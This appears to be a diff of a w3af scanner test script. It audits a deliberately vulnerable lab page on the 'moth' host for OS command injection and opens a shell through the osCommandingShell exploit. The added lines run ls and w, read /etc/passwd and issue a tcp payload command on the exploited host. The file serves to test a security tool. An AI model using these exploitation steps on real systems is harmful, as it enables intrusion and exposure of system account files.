@@ -13,15 +13,10 @@ back
 
 plugins
 audit osCommanding
-
-discovery webSpider
-discovery config webSpider
-set onlyForward True
-back
 back
 
 target
-set target http://moth/w3af/audit/os_commanding/
+set target http://moth/w3af/audit/os_commanding/simple_osc.php?cmd=fas
 back
 start
 
@@ -30,10 +25,12 @@ assert len(kb.kb.getData('osCommanding','osCommanding')) == 3
 exploit
 exploit osCommandingShell
 interact 0
-ls
-w
-endInteraction
 
-assert len(kb.kb.getData('osCommandingShell','shell')) == 1
+execute ls
+execute w
+read /etc/passwd
+payload tcp
+
+endInteraction
 
 exit
